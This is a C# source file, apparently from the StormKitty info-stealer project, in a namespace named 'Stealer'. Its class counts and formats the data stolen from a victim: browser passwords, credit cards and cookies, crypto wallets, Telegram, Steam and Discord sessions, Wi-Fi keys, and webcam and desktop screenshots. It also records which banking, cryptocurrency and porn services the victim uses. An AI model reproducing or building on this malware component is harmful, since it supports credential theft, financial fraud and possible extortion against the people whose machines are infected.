/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System.Collections.Generic;

namespace Stealer
{
    internal sealed class Counter
    {
        // Browsers
        public static int Passwords = 0;
        public static int CreditCards = 0;
        public static int AutoFill = 0;
        public static int Cookies = 0;
        public static int History = 0;
        public static int Bookmarks = 0;
        public static int Downloads = 0;
        // Applications
        public static int VPN = 0;
        public static int Pidgin = 0;
        public static int Wallets = 0;
        public static int FTPHosts = 0;
        // Sessions, tokens
        public static bool Telegram = false;
        public static bool Steam = false;
        public static bool Uplay = false;
        public static bool Discord = false;
        // System data
        public static int SavedWifiNetworks = 0;
        public static bool ProductKey = false;
        public static bool DesktopScreenshot = false;
        public static bool WebcamScreenshot = false;
        // Grabber stats
        public static int GrabberDocuments = 0;
        public static int GrabberSourceCodes = 0;
        public static int GrabberDatabases = 0;
        public static int GrabberImages = 0;
        // Banking & Cryptocurrency services detection
        public static bool BankingServices = false;
        public static bool CryptoServices = false;
        public static bool PornServices = false;
        public static List<string> DetectedBankingServices = new List<string>();
        public static List<string> DetectedCryptoServices = new List<string>();
        public static List<string> DetectedPornServices = new List<string>();

        // Get string value
        public static string GetSValue(string application, bool value)
        {
            return value ? "\n   ∟ " + application : "";
        }

        // Get integer value
        public static string GetIValue(string application, int value)
        {
            return value != 0 ? "\n   ∟ " + application + ": " + value: "";
        }

        // Get list value
        public static string GetLValue(string application, List<string> value, char separator = '∟')
        {
            value.Sort(); // Sort list items
            return value.Count != 0 ? "\n   ∟ " + application + ":\n\t\t\t\t\t\t\t" + separator + " " +
                string.Join("\n\t\t\t\t\t\t\t" + separator + " ", value) : "\n   ∟ " + application + " (No data)";
        }

        // Get boolean value
        public static string GetBValue(bool value, string success, string failed)
        {
            return value ? "\n   ∟ " + success : "\n   ∟ " + failed;
        }

    }
}
